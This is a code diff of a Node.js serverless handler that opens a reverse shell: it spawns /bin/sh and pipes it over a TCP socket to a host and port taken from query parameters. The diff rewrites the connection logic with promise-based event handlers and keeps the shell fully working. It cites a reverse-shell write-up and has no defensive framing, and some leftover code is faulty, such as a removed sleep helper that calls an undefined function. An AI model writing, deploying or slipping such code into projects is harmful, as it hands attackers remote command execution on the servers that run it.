@@ -2,21 +2,10 @@
 https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/
 https://stackoverflow.com/a/33292942
 */
-'use strict';
-
 const net = require('net');
 const cp = require('child_process');
 
-function timeout(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-async function sleep(ms) {
-  await timeout(ms);
-  return fn(...args);
-}
-
-module.exports.panther = async event => {
+module.exports.panther = async (event) => {
   let host;
   let port;
 
@@ -29,8 +18,8 @@ module.exports.panther = async event => {
     return {
       statusCode: 400,
       body: JSON.stringify({
-        Error: 'Must provide the host and port for the target TCP server as query parameters.'
-      })
+        message: 'Must provide the host and port for the target TCP server as query parameters.',
+      }),
     };
   }
 
@@ -39,18 +28,47 @@ module.exports.panther = async event => {
   const sh = cp.spawn('/bin/sh', []);
   const client = new net.Socket();
 
-  client.connect(portNum, host, () => {
-    client.pipe(sh.stdin);
-    sh.stdout.pipe(client);
-    sh.stderr.pipe(client);
-  });
+  try {
+    await new Promise((resolve, reject) => {
+      client.connect(portNum, host, () => {
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+      });
 
-  await sleep(30000);
+      client.on('close', (hadError) => {
+        if (hadError) {
+          reject(new Error('Transmission error.'));
+        } else {
+          resolve();
+        }
+      });
 
-  return {
-    statusCode: 500,
-    body: JSON.stringify({
-      Error: 'Function timeout.'
-    })
-  };
+      client.on('end', () => {
+        resolve();
+      });
+
+      client.on('error', (err) => {
+        reject(err);
+      });
+
+      client.on('timeout', () => {
+        reject(new Error('Socket timeout.'));
+      });
+    });
+
+    return {
+      statusCode: 400,
+      body: JSON.stringify({
+        message: 'Connection terminated from client.',
+      }),
+    };
+  } catch (err) {
+    return {
+      statusCode: 500,
+      body: JSON.stringify({
+        message: 'Connection terminated from client.',
+      }),
+    };
+  }
 };
